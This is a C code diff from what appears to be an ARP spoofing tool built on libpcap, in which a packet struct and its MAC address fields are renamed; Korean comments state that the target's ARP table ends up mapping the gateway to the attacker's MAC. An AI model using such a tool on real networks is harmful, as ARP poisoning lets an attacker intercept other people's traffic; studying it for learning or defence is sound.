@@ -19,16 +19,16 @@ void broadcast(char *argv[], pcap_t *pcapHandle)
       이후 relpy 응답이 오면 공격 대상의 ARP 테이블에는 게이트웨이가 공격자의 mac주소로 변경되어 있다.
       */
       u_char pkt[PACKETSIZE];
-      struct allpacket *s_packet = (struct allpacket *)pkt;
+      struct eth_arp_header *s_packet = (struct eth_arp_header *)pkt;
 
       // Ethernet 주소 설정
       for (int i = 0; i <= 5; i++)
       {
-            s_packet->eth_dmac[i] = 0xFF;
+            s_packet->eth_dst_mac[i] = 0xFF;
       }
       for (int i = 0; i <= 5; i++)
       {
-            s_packet->eth_smac[i] = mymac[i]; // 나의 mac 입력
+            s_packet->eth_src_mac[i] = mymac[i]; // 나의 mac 입력
       }
 
       s_packet->type = ntohs(0x0806);          // ARP 0x0806
@@ -77,16 +77,16 @@ void gateway_mac(char *argv[], pcap_t *pcapHandle)
       */
 
       u_char pkt[PACKETSIZE];
-      struct allpacket *s_packet = (struct allpacket *)pkt;
+      struct eth_arp_header *s_packet = (struct eth_arp_header *)pkt;
 
       // Ethernet 주소 설정
       for (int i = 0; i <= 5; i++)
       {
-            s_packet->eth_dmac[i] = 0xFF;
+            s_packet->eth_dst_mac[i] = 0xFF;
       }
       for (int i = 0; i <= 5; i++)
       {
-            s_packet->eth_smac[i] = mymac[i]; // 나의 mac 입력
+            s_packet->eth_src_mac[i] = mymac[i]; // 나의 mac 입력
       }
 
       s_packet->type = ntohs(0x0806);          // ARP 0x0806
@@ -99,7 +99,7 @@ void gateway_mac(char *argv[], pcap_t *pcapHandle)
       // 나의 mac 입력 (sender 의 mac 주소)
       for (int i = 0; i <= 5; i++)
       {
-            s_packet->arp_sender_mac[i] = s_packet->eth_smac[i];
+            s_packet->arp_sender_mac[i] = s_packet->eth_src_mac[i];
       }
 
       s_packet->arp_sender_ip = inet_addr(myip);
